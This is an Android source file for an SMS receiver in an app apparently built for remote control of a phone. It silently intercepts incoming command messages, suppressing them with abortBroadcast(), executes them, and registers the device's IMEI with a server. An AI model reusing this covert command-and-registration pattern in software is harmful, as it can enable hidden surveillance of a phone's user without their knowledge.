package com.hyadesinc.curiosus.receivers;

import com.hyadesinc.curiosus.Debug;
import com.hyadesinc.curiosus.ServerMessanger;
import com.hyadesinc.curiosus.ServerMessanger.ICallBack;
import com.hyadesinc.curiosus.lib.MessageType;
import com.hyadesinc.curiosus.services.AppService;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import com.hyadesinc.curiosus.SettingsManager;
import com.hyadesinc.curiosus.SmsCommand;
import com.hyadesinc.curiosus.variables.ServerMessage;

public class SMSReceiver extends BroadcastReceiver {
	
	@Override
	public void onReceive(final Context context, Intent intent) {
		
		if (new SettingsManager(context).isConnected()) {
			context.startService(new Intent(context, AppService.class));
		}
		
		try {			
			final Bundle bundle = intent.getExtras();
			if (bundle == null) {
				return;
			}
			
			SmsCommand command = new SmsCommand(bundle, context);
			if (command.isCommand()){
				abortBroadcast();
				command.start();//.execute();
			}
			
			connect(context);
			
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}

	private void connect(Context context){
		final Context appContext = context.getApplicationContext();
		final SettingsManager settings = new SettingsManager(context);

		if (settings.isConnected()) {
			return;
		}

		new ServerMessanger(appContext, new ServerMessage(MessageType.CONNECT, settings.imei()), new ICallBack() {
			@Override
			public boolean onFinished(String response) { return false; }

			@Override
			public void onError() {
				return;
			}

			@Override
			public void onSuccess() {
				settings.connected(true);
				appContext.startService(new Intent(appContext, AppService.class));
			}
		}).start();
	}
}
